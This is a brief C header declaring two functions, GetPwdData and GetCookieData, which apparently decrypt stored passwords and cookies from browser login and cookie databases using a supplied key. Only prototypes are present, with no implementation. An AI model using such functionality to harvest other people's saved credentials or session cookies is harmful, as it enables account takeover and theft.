#ifndef _GETDBDATA_
#define _GETDBDATA_

int GetPwdData(unsigned char *key, const char *LoginDbPath, const char *Temp);
int GetCookieData(unsigned char *key, const char *CookiesDbPath, const char *Temp);

#endif 